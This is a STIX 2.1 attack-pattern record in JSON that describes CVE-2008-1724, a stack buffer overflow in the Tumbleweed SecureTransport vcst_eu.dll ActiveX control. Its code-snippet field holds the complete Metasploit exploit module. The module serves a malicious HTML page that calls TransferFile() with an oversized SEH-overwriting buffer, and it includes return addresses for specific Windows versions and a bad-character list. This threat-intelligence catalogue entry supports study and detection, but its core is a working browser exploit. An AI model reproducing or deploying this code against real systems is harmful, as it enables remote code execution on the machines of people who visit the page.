{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--051d7029-7f40-40bd-bb3d-74f4cfda69ba",
    "created": "2024-08-14T16:44:59.65488Z",
    "modified": "2024-08-14T16:44:59.654884Z",
    "name": "Tumbleweed FileTransfer vcst_eu.dll ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the vcst_eu.dll FileTransfer Module (1.0.0.5) ActiveX control in the Tumbleweed SecureTransport suite. By sending an overly long string to the TransferFile() 'remotefile' function, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/tumbleweed_filetransfer.rb",
            "external_id": "tumbleweed_filetransfer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-1724"
        },
        {
            "source_name": "reference",
            "url": "http://www.aushack.com/200708-tumbleweed.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Tumbleweed FileTransfer vcst_eu.dll ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the vcst_eu.dll\n        FileTransfer Module (1.0.0.5) ActiveX control in the Tumbleweed\n        SecureTransport suite. By sending an overly long string to the\n        TransferFile() 'remotefile' function, an attacker may be able\n        to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'aushack',\n      'References'     =>\n        [\n          [ 'CVE', '2008-1724' ],\n          [ 'OSVDB', '44252' ],\n          [ 'URL', 'http://www.aushack.com/200708-tumbleweed.txt' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'\t\t=>\n        {\n          'Space'\t\t=> 1000,\n          'BadChars'\t=> \"\\x00\\x0a\\x0d\\x80\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0<>()\\\"\\\\\",\n        },\n      'Platform'\t\t=> 'win',\n      'Targets'\t\t=>\n        [\n          # Patrick - tested successfully against W2KSP0 EN, W2KSP4 EN, XPSP0 EN, 2007/08/17.\n          [ 'Universal vcst_eu.dll',\t\t{ 'Ret' => 0x1001ee75 } ],\n          [ 'Windows 2000 Pro English',   \t{ 'Ret' => 0x75022ac4 } ],\n          [ 'Windows XP Pro SP0/SP1 English',\t{ 'Ret' => 0x71aa32ad } ],\n        ],\n      'DisclosureDate' => '2008-04-07',\n      'DefaultTarget' => 0))\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t\t= rand_text_alpha(rand(100) + 1)\n    vurl \t\t= rand_text_alpha(rand(100) + 1)\n    vhostName\t= rand_text_alpha(rand(100) + 1)\n    vlocalFile \t= rand_text_alpha(rand(100) + 1)\n    vMD5\t \t= rand_text_alpha(rand(100) + 1)\n\n    # Build the exploit buffer\n    filler = rand_text_alpha(4620)\n    seh = generate_seh_payload(target.ret)\n    sploit = filler + seh\n\n    # Build out the message\n    content = %Q|\n      <html>\n      <object classid=\"CLSID:38681fbd-d4cc-4a59-a527-b3136db711d3\" id=\"#{vname}\"></object>\n      <script language=\"javascript\">\n      #{vname}.TransferFile(\"#{vurl}\", \"#{vhostName}\", \"#{vlocalFile}\", \"#{sploit}\", \"#{vMD5}\", false, false, 80, false, true, true, 420)\n      </script>\n      </html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-04-07",
    "x_mitre_platforms": [
        "win'"
    ]
}